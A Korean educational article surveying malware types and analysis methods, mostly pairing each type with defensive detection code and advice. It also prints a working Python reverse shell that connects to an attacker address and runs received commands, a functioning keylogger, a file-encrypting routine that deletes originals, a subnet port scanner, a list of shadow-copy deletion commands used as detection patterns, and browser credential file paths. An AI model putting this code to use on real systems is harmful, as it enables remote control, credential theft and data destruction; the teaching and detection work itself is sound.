# 악성코드 종류 및 분석

> 악성코드(Malware)는 Malicious Software의 줄임말로, 사용자 몰래 시스템에 침투하여 정보를 훔치거나 파일을 암호화하는 등 피해를 주는 모든 악의적 소프트웨어를 말한다. 이 글에서는 주요 악성코드 유형과 동작 원리를 코드와 함께 정리한다.

---

## 악성코드 분류 한눈에 보기

|------|-----------|-----------|-----------|-----------|
| 바이러스 | 파일에 붙어 전파 | ✓ | ✓ | 파괴·전파 |
| 웜 | 네트워크 자동 전파 | ✓ | ✗ | 전파·DDoS |
| 트로이목마 | 정상 프로그램으로 위장 | ✗ | ✗ | 백도어·정보탈취 |
| 랜섬웨어 | 파일 암호화 후 협박 | ✗ | ✗ | 금전 갈취 |

## 1. 바이러스 (Virus)

### 개념

바이러스는 정상 실행 파일(`.exe`, `.docm` 등)에 자신의 코드를 삽입하여, 해당 파일이 실행될 때 함께 실행되는 악성코드다. 감염된 파일을 다른 사람에게 전달하면서 전파된다.

### 동작 방식

```
정상 파일 실행
    └→ 바이러스 코드 먼저 실행
           └→ 다른 실행 파일에 자신을 복사·삽입
                  └→ 원래 프로그램 정상 실행 (탐지 회피)
```

### 코드 예시 — 파일 감염 탐지 (방어 관점)

실제 바이러스는 PE 파일의 섹션에 코드를 삽입한다. 아래는 파일 변조 여부를 해시로 검사하는 방어 코드다.

```python
import hashlib
import os

def get_file_hash(filepath: str) -> str:
    """파일의 SHA-256 해시를 계산한다."""
    sha256 = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            sha256.update(chunk)
    return sha256.hexdigest()

def check_integrity(filepath: str, known_hash: str) -> bool:
    """파일이 원본과 동일한지 확인한다."""
    current_hash = get_file_hash(filepath)
    if current_hash != known_hash:
        print(f"[경고] {filepath} 파일이 변조되었습니다!")
        print(f"  원본 해시: {known_hash}")
        print(f"  현재 해시: {current_hash}")
        return False
    return True

# 사용 예시
original_hash = get_file_hash("target.exe")
print(f"원본 해시 저장: {original_hash}")

# 나중에 무결성 검사
check_integrity("target.exe", original_hash)
```

### 탐지 및 방어

- **해시 기반 무결성 검사** — 실행 파일의 해시값을 주기적으로 비교
- **코드 서명 검증** — 신뢰된 서명이 없는 파일 실행 차단
- **안티바이러스 시그니처** — 알려진 바이러스 패턴(시그니처) 매칭

## 2. 웜 (Worm)

### 개념

웜은 숙주 파일 없이 **네트워크를 통해 스스로 전파**하는 악성코드다. 취약한 포트를 스캔하고 자동으로 공격하여 다른 시스템을 감염시킨다. 2003년 SQL Slammer, 2017년 WannaCry가 대표적이다.

### 동작 방식

```
감염 PC
    └→ 네트워크 IP 범위 스캔 (예: 445/tcp, SMB)
           └→ 취약점 발견 시 자동 공격·침투
                  └→ 자신을 복사하여 실행
                         └→ 다시 스캔 반복
```

### 코드 예시 — 네트워크 포트 스캔 (탐지 관점)

웜이 사용하는 스캔 패턴을 이해하면 탐지에 도움이 된다.

```python
import socket
import ipaddress
from concurrent.futures import ThreadPoolExecutor

def check_port(ip: str, port: int, timeout: float = 0.5) -> bool:
    """특정 IP·포트가 열려 있는지 확인한다."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def scan_subnet(subnet: str, port: int):
    """서브넷 내 열린 포트를 스캔한다."""
    network = ipaddress.ip_network(subnet, strict=False)
    open_hosts = []

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {
            executor.submit(check_port, str(ip), port): str(ip)
            for ip in network.hosts()
        }
        for future, ip in futures.items():
            if future.result():
                open_hosts.append(ip)
                print(f"[열린 포트 발견] {ip}:{port}")

    return open_hosts

# 사용 예시 (내부 네트워크 점검용)
# scan_subnet("192.168.1.0/24", 445)
```

> **주의:** 위 코드는 자신이 소유하거나 명시적 허가를 받은 네트워크에서만 사용해야 한다. 무단 스캔은 불법이다.

### 탐지 및 방어

- **방화벽으로 불필요한 포트 차단** — SMB(445), RDP(3389) 등 외부 노출 최소화
- **네트워크 이상 트래픽 탐지** — 단시간 대량 스캔 패턴 감지 (IDS/IPS)
- **OS·소프트웨어 패치** — 웜이 악용하는 취약점을 신속히 패치

## 3. 트로이목마 (Trojan Horse)

### 개념

정상 프로그램처럼 위장하여 사용자가 직접 실행하도록 유도하는 악성코드다. 실행 후 백도어를 열거나, RAT(원격 접근 도구)를 설치하여 공격자가 시스템을 원격으로 제어한다.

### 동작 방식

```
사용자: "무료 게임 설치파일 다운로드"
    └→ 실행 시 겉으로는 게임 설치
           └→ 뒤에서 C2 서버에 연결
                  └→ 공격자가 원격으로 명령 전달
                         └→ 파일 탈취, 화면 캡처, 추가 악성코드 설치
```

### 코드 예시 — 역방향 셸 개념 (C2 통신 원리)

트로이목마는 보통 **역방향 연결(Reverse Shell)** 을 사용한다. 피해자 PC가 공격자 서버에 먼저 연결하므로, 방화벽의 인바운드 차단을 우회한다.

```python
# [피해자 측 동작 개념] — 교육 목적
import socket
import subprocess

def reverse_shell_concept(attacker_ip: str, attacker_port: int):
    """
    역방향 셸 동작 원리 설명용 코드.
    실제 공격에 사용 금지.
    """
    # 공격자 서버에 먼저 연결 (인바운드 방화벽 우회)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))

    while True:
        # 명령 수신
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break

        # 명령 실행 및 결과 전송
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True
        )
        output = result.stdout + result.stderr
        s.send(output.encode())

    s.close()
```

```python
# [방어 측 — C2 트래픽 탐지 예시]
import psutil
import socket

def detect_suspicious_connections(suspicious_ports: list[int]):
    """비정상 외부 연결을 탐지한다."""
    for conn in psutil.net_connections(kind="inet"):
        if conn.status == "ESTABLISHED" and conn.raddr:
            remote_ip, remote_port = conn.raddr
            # 알 수 없는 외부 IP로의 비정상 포트 연결 탐지
            if remote_port in suspicious_ports:
                pid = conn.pid
                try:
                    proc = psutil.Process(pid)
                    print(f"[의심 연결] PID={pid} ({proc.name()})")
                    print(f"  → {remote_ip}:{remote_port}")
                except psutil.NoSuchProcess:
                    pass

detect_suspicious_connections([4444, 1234, 31337])
```

### 탐지 및 방어

- **애플리케이션 화이트리스트** — 승인된 프로그램만 실행 허용
- **아웃바운드 방화벽 규칙** — 알 수 없는 외부 IP로의 연결 차단
- **EDR(엔드포인트 탐지·대응)** — 프로세스의 비정상 네트워크 연결 탐지

## 4. 랜섬웨어 (Ransomware)

### 개념

피해자의 파일을 암호화하고 복호화 키를 대가로 몸값(Ransom)을 요구하는 악성코드다. 2024년 Change Healthcare 사건에서 단일 공격으로 33억 달러 피해를 낳았을 만큼 가장 파괴적인 유형이다.

### 동작 방식

```
침투 (피싱·취약점 악용)
    └→ 내부 확산 및 데이터 유출 (이중 갈취 준비)
           └→ 볼륨 쉐도우 복사본 삭제 (백업 무력화)
                  └→ 파일 암호화 (AES-256 + RSA-2048)
                         └→ 랜섬노트 생성
                                └→ 몸값 요구
```

### 코드 예시 — 파일 암호화·복호화 원리

```python
from cryptography.fernet import Fernet
import os

# ── 키 생성 (실제 랜섬웨어는 이 키를 공격자 서버에 전송) ──
def generate_key() -> bytes:
    return Fernet.generate_key()

# ── 파일 암호화 ──
def encrypt_file(filepath: str, key: bytes):
    fernet = Fernet(key)
    with open(filepath, "rb") as f:
        original = f.read()
    encrypted = fernet.encrypt(original)
    with open(filepath + ".locked", "wb") as f:
        f.write(encrypted)
    os.remove(filepath)
    print(f"[암호화] {filepath} → {filepath}.locked")

# ── 파일 복호화 ──
def decrypt_file(filepath: str, key: bytes):
    fernet = Fernet(key)
    with open(filepath, "rb") as f:
        encrypted = f.read()
    decrypted = fernet.decrypt(encrypted)
    original_path = filepath.replace(".locked", "")
    with open(original_path, "wb") as f:
        f.write(decrypted)
    os.remove(filepath)
    print(f"[복호화] {filepath} → {original_path}")

# ── 사용 예시 ──
key = generate_key()
print(f"암호화 키: {key.decode()}")

# 테스트 파일 생성
with open("test.txt", "w") as f:
    f.write("중요한 문서 내용입니다.")

encrypt_file("test.txt", key)   # test.txt → test.txt.locked
decrypt_file("test.txt.locked", key)  # 복원
```

### 볼륨 쉐도우 복사본 삭제 탐지

랜섬웨어는 Windows 백업(VSS)을 먼저 삭제한다. 이 명령 실행을 탐지하면 초기에 차단할 수 있다.

```python
import subprocess
import sys

RANSOMWARE_COMMANDS = [
    "vssadmin delete shadows",
    "wmic shadowcopy delete",
    "bcdedit /set {default} recoveryenabled no",
    "wbadmin delete catalog",
]

def monitor_dangerous_commands(command: str) -> bool:
    """랜섬웨어가 주로 실행하는 명령어인지 확인한다."""
    for pattern in RANSOMWARE_COMMANDS:
        if pattern.lower() in command.lower():
            print(f"[위험] 랜섬웨어 의심 명령어 탐지: {command}")
            return True
    return False

# 예시
test_cmd = "vssadmin delete shadows /all /quiet"
monitor_dangerous_commands(test_cmd)
```

### 탐지 및 방어

- **3-2-1 백업 원칙** — 3개 복사본, 2개 미디어, 1개 오프라인(에어갭) 보관
- **볼륨 쉐도우 보호** — VSS 명령 실행을 모니터링하고 차단
- **최소 권한 원칙** — 일반 사용자 계정은 시스템 전체 암호화 권한 없도록 설정
- **MFA 필수 적용** — Change Healthcare처럼 원격 접속 자격증명만으로 침투하는 시나리오 차단

## 5. 키로거 (Keylogger)

### 개념

사용자의 키 입력을 몰래 기록하여 비밀번호·신용카드 번호·메시지 등을 탈취하는 악성코드다. 하드웨어 키로거(키보드와 PC 사이에 장치 삽입)와 소프트웨어 키로거로 나뉜다.

### 코드 예시 — 소프트웨어 키로거 원리

```python
# pynput 라이브러리 기반 키 입력 감지 예시 (교육용)
from pynput import keyboard
import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    """키 입력 이벤트 처리."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        char = key.char  # 일반 문자키
    except AttributeError:
        char = f"[{key}]"  # 특수키 (Enter, Shift 등)

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} | {char}\n")

def start_keylogger():
    print("키로거 시작 (Esc로 종료)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# start_keylogger()
```

로그 파일 예시:
```
2026-06-04 14:32:01 | p
2026-06-04 14:32:01 | a
2026-06-04 14:32:02 | s
2026-06-04 14:32:02 | s
2026-06-04 14:32:02 | w
2026-06-04 14:32:02 | o
2026-06-04 14:32:03 | r
2026-06-04 14:32:03 | d
2026-06-04 14:32:03 | [Key.enter]
```

### 탐지 및 방어

- **가상 키보드 사용** — 금융 사이트 등에서 마우스로 클릭하는 가상 키보드 활용
- **안티키로거 솔루션** — 키보드 훅 프로세스를 탐지하여 차단
- **프로세스 모니터링** — `keyboard.Listener` 같은 훅을 등록한 프로세스 감시

## 6. 인포스틸러 (Infostealer)

### 개념

브라우저에 저장된 비밀번호, 쿠키, 자동완성 데이터, 암호화폐 지갑, FTP 자격증명 등을 수집하는 악성코드다. Lumma, Raccoon, RedLine이 대표적이며, 2024년 Snowflake 침해 사건처럼 탈취된 자격증명이 대규모 2차 공격에 활용된다.

### 코드 예시 — Chrome 저장 비밀번호 위치 파악 (방어 관점)

인포스틸러가 어디서 데이터를 수집하는지 알면 방어에 도움이 된다.

```python
import os
import platform

def get_browser_profile_paths() -> dict:
    """
    주요 브라우저의 자격증명 저장 경로를 반환한다.
    인포스틸러가 주로 탐색하는 경로다.
    """
    system = platform.system()
    paths = {}

    if system == "Windows":
        appdata = os.environ.get("LOCALAPPDATA", "")
        roaming = os.environ.get("APPDATA", "")
        paths = {
            "Chrome":  os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "Login Data"),
            "Edge":    os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
            "Firefox": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
        }
    elif system == "Darwin":  # macOS
        home = os.path.expanduser("~")
        paths = {
            "Chrome":  os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
            "Safari":  os.path.join(home, "Library", "Safari", "Logins.plist"),
        }

    for browser, path in paths.items():
        exists = "존재" if os.path.exists(path) else "없음"
        print(f"[{browser}] {path} → {exists}")

    return paths

get_browser_profile_paths()
```

### 탐지 및 방어

- **브라우저 비밀번호 저장 사용 중단** — 전용 비밀번호 관리자(1Password, Bitwarden 등) 사용
- **자격증명 유출 모니터링** — HaveIBeenPwned, SpyCloud로 자신의 계정 유출 여부 확인
- **MFA 적용** — 자격증명이 탈취되어도 2차 인증으로 계정 보호

## 7. 루트킷 (Rootkit)

### 개념

운영체제의 핵심(커널)에 숨어 자신과 다른 악성코드의 존재를 감추는 악성코드다. 프로세스 목록, 파일 목록, 네트워크 연결 목록에서 자신을 숨겨 탐지를 극도로 어렵게 만든다.

### 동작 방식 — API 후킹

```
일반 프로그램이 "프로세스 목록 조회" 요청
    └→ 루트킷이 Windows API를 가로챔 (후킹)
           └→ 악성 프로세스를 목록에서 제거
                  └→ 변조된 결과를 프로그램에 반환
                         └→ 탐지 도구에 악성 프로세스가 보이지 않음
```

### 코드 예시 — 프로세스 숨김 탐지

```python
import psutil
import subprocess

def compare_process_lists() -> list:
    """
    psutil과 OS 명령어의 프로세스 목록을 비교하여
    루트킷에 의해 숨겨진 프로세스를 탐지한다.
    """
    # psutil로 수집한 PID 목록
    psutil_pids = set(psutil.pids())

    # OS 명령어로 수집한 PID 목록 (Windows: tasklist / Linux: ps)
    result = subprocess.run(
        ["tasklist", "/fo", "csv", "/nh"],
        capture_output=True, text=True
    )
    os_pids = set()
    for line in result.stdout.strip().split("\n"):
        parts = line.strip('"').split('","')
        if len(parts) > 1:
            try:
                os_pids.add(int(parts[1]))
            except ValueError:
                pass

    # 두 목록의 차이 = 루트킷에 의해 숨겨졌을 가능성
    hidden = psutil_pids - os_pids
    if hidden:
        print(f"[경고] 숨겨진 프로세스 의심: PID {hidden}")
    else:
        print("[정상] 두 목록이 일치합니다.")

    return list(hidden)
```

### 탐지 및 방어

- **부팅 전 스캔** — OS 부팅 전 외부 미디어로 스캔 (루트킷이 로드되기 전)
- **커널 무결성 검증** — Windows Secure Boot, Kernel Patch Protection
- **하이퍼바이저 기반 탐지** — VM 위에서 게스트 OS 메모리를 외부에서 분석

## 8. 봇넷 (Botnet)

### 개념

악성코드에 감염된 수많은 PC(봇, Bot)를 하나의 네트워크로 묶어 공격자가 원격으로 제어하는 시스템이다. DDoS 공격, 스팸 발송, 암호화폐 채굴 등에 활용된다.

### 구조

```
공격자 (C2 서버 운영)
    └→ C2 서버 (Command & Control)
           ├→ 봇 #1 (감염된 일반 PC)
           ├→ 봇 #2
           ├→ 봇 #3
           └→ 봇 #N  ← 수만~수백만 대
                  └→ 일제히 명령 수행 (DDoS, 스팸 등)
```

### 코드 예시 — DDoS 트래픽 탐지

```python
import collections
import time
from datetime import datetime

# 간단한 요청 속도 기반 DDoS 탐지 시뮬레이션
class DDoSDetector:
    def __init__(self, threshold: int = 100, window: int = 10):
        self.threshold = threshold  # 허용 요청 수
        self.window = window        # 시간 창 (초)
        self.request_log: dict = collections.defaultdict(list)

    def record_request(self, ip: str):
        now = time.time()
        # 오래된 기록 제거
        self.request_log[ip] = [
            t for t in self.request_log[ip] if now - t < self.window
        ]
        self.request_log[ip].append(now)

        count = len(self.request_log[ip])
        if count > self.threshold:
            print(f"[DDoS 의심] {ip} → {self.window}초 내 {count}회 요청")
            return True
        return False

detector = DDoSDetector(threshold=10, window=5)

# 시뮬레이션: 특정 IP가 짧은 시간에 대량 요청
for _ in range(15):
    detector.record_request("192.168.1.100")
    time.sleep(0.1)
```

## 악성코드 분석 방법

### 정적 분석 (Static Analysis)

악성코드를 **실행하지 않고** 분석하는 방법이다.

```bash
# 파일 해시 확인
sha256sum malware.exe

# 문자열 추출 (하드코딩된 IP, URL, 함수명 확인)
strings malware.exe | grep -E "(http|\.exe|cmd|powershell)"

# PE 파일 구조 분석
pe-bear malware.exe

# YARA 룰로 악성코드 패턴 매칭
yara rules/malware_rules.yar malware.exe
```

**YARA 룰 예시** — 랜섬웨어 탐지 룰:

```yara
rule Ransomware_Generic {
    meta:
        description = "일반적인 랜섬웨어 패턴 탐지"
        author      = "security-team"

    strings:
        $vss1 = "vssadmin delete shadows" nocase
        $vss2 = "wmic shadowcopy delete"  nocase
        $ext1 = ".locked"
        $ext2 = ".encrypted"
        $note = "YOUR FILES HAVE BEEN ENCRYPTED" nocase

    condition:
        any of ($vss*) or (any of ($ext*) and $note)
}
```

### 동적 분석 (Dynamic Analysis)

악성코드를 **격리된 환경(샌드박스)에서 실제 실행**하여 동작을 관찰하는 방법이다.

```bash
# 프로세스 모니터링 (Process Monitor, Windows)
procmon.exe /Quiet /Minimized /BackingFile capture.pml

# 네트워크 트래픽 캡처
wireshark -i eth0 -w malware_traffic.pcap

# 자동 샌드박스 분석 (Cuckoo Sandbox)
cuckoo submit malware.exe
```

| 도구 | 용도 |
|------|------|
| VirusTotal | 다중 AV 엔진으로 파일 스캔 |
| Any.run | 온라인 대화형 샌드박스 |
| Cuckoo Sandbox | 오픈소스 자동 분석 환경 |
| Ghidra / IDA Pro | 역공학(디스어셈블·디컴파일) |
| Wireshark | 네트워크 트래픽 캡처·분석 |
| Process Monitor | 파일·레지스트리·프로세스 행위 추적 |

## 종합 방어 전략

```
예방 (Prevention)
├─ 소프트웨어 최신 패치 유지
├─ 모든 원격 접속에 MFA 적용
├─ 최소 권한 원칙 (PoLP)
└─ 사용자 보안 인식 교육

탐지 (Detection)
├─ 안티바이러스·EDR 운영
├─ SIEM으로 로그 중앙 수집·분석
├─ 네트워크 이상 트래픽 모니터링 (IDS/IPS)
└─ 자격증명 유출 모니터링

대응 (Response)
├─ 인시던트 대응 플레이북 사전 수립
├─ 감염 시스템 즉시 네트워크 격리
└─ 3-2-1 백업으로 빠른 복구

복구 (Recovery)
├─ 에어갭 백업에서 데이터 복원
├─ 루트 원인 분석 후 재발 방지
└─ 사고 보고서 작성 및 공유
```
